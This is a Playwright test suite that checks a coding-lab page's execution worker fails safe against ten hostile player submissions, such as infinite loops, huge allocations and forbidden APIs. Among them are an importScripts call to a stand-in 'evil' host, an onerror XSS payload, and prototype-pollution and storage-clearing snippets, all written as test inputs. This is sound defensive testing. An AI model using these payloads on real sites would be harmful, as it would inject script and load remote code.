import { expect, test } from '@playwright/test';

import { CORRECT, editor, reachLab, runCode } from './helpers';

/**
 * S1–S10 (docs/10-testing-and-security.md §6).
 *
 * These assert that the worker **fails safe**, not that it is a sandbox. S3–S5
 * and S8 assert the prelude's behaviour, which is a mitigation with a documented
 * residual risk (docs/08 §8). Nothing here may be read as a security guarantee.
 */

function mentor(page: import('@playwright/test').Page) {
  return page.getByRole('region', { name: 'Mentor' });
}

test.beforeEach(async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 900 });
});

test('S1 · an infinite loop is terminated and the editor stays usable', async ({ page }) => {
  await reachLab(page);

  const started = Date.now();
  await runCode(page, 'function isOverLimit(temperature, limit) {\n  while (true) {}\n}');
  await expect(mentor(page).getByText('La ejecución no terminó a tiempo.')).toBeVisible();
  const elapsed = Date.now() - started;

  expect(elapsed).toBeLessThan(2_500);
  await expect(editor(page)).toBeEnabled();

  await runCode(page, CORRECT);
  await expect(mentor(page).getByText('Las pruebas pasan.')).toBeVisible();
});

test('S2 · a 10 GB allocation cannot take the page down', async ({ page }) => {
  await reachLab(page);
  await runCode(page, 'function isOverLimit(temperature, limit) {\n  return new Array(1e10);\n}');

  await expect(mentor(page).getByText('El código se detuvo con un error.')).toBeVisible();
  await expect(mentor(page).getByText(/RangeError/)).toBeVisible();
  await expect(editor(page)).toBeEnabled();
});

test('S3 · fetch is not available', async ({ page }) => {
  await reachLab(page);
  await runCode(page, "function isOverLimit(temperature, limit) {\n  return fetch('/api/secret');\n}");

  await expect(mentor(page).getByText(/fetch is not available/)).toBeVisible();
});

test('S4 · indexedDB is not available', async ({ page }) => {
  await reachLab(page);
  await runCode(page, "function isOverLimit(temperature, limit) {\n  return indexedDB.open('x');\n}");

  await expect(mentor(page).getByText(/indexedDB is not available/)).toBeVisible();
});

test('S5 · importScripts is not available', async ({ page }) => {
  await reachLab(page);
  await runCode(
    page,
    "function isOverLimit(temperature, limit) {\n  return importScripts('https://evil/x.js');\n}",
  );

  await expect(mentor(page).getByText(/importScripts is not available/)).toBeVisible();
});

test('S6 · returned HTML is rendered as text, never as markup', async ({ page }) => {
  await reachLab(page);
  await runCode(
    page,
    'function isOverLimit(temperature, limit) {\n  return \'<img src=x onerror="window.__pwned = 1">\';\n}',
  );

  await expect(page.getByRole('region', { name: 'Pruebas visibles' }).getByText(/img src=x/).first()).toBeVisible();
  await expect(page.locator('img')).toHaveCount(0);
  expect(await page.evaluate(() => (window as { __pwned?: unknown }).__pwned)).toBeUndefined();
});

test('S7 · a 5 MB return value is rejected with a clear message', async ({ page }) => {
  await reachLab(page);
  await runCode(
    page,
    "function isOverLimit(temperature, limit) {\n  return 'x'.repeat(5 * 1024 * 1024);\n}",
  );

  await expect(mentor(page).getByText('El valor devuelto no tiene la forma esperada.')).toBeVisible();
  await expect(mentor(page).getByText(/demasiada información/)).toBeVisible();
  await expect(mentor(page).getByText('Las pruebas pasan.')).toHaveCount(0);
});

test('S8 · player code cannot chatter on the worker channel', async ({ page }) => {
  await reachLab(page);
  await runCode(
    page,
    "function isOverLimit(temperature, limit) {\n  for (let i = 0; i < 1000; i += 1) postMessage({ kind: 'completed' });\n  return true;\n}",
  );

  await expect(mentor(page).getByText(/postMessage is not available/)).toBeVisible();
  await expect(page.getByRole('button', { name: 'Ejecutar' })).toBeEnabled();
});

test('S9 · a polluted prototype does not cross the worker boundary', async ({ page }) => {
  await reachLab(page);
  await runCode(
    page,
    "function isOverLimit(temperature, limit) {\n  Object.prototype.polluted = 'yes';\n  return temperature > limit;\n}",
  );

  await expect(mentor(page).getByText('Las pruebas pasan.')).toBeVisible();
  expect(
    await page.evaluate(() => (Object.prototype as { polluted?: string }).polluted),
  ).toBeUndefined();
});

test('S10 · localStorage is not reachable from player code', async ({ page }) => {
  await reachLab(page);
  await runCode(
    page,
    'function isOverLimit(temperature, limit) {\n  localStorage.clear();\n  return true;\n}',
  );

  await expect(mentor(page).getByText(/localStorage is not defined/)).toBeVisible();
  expect(await page.evaluate(() => typeof localStorage)).toBe('object');
});
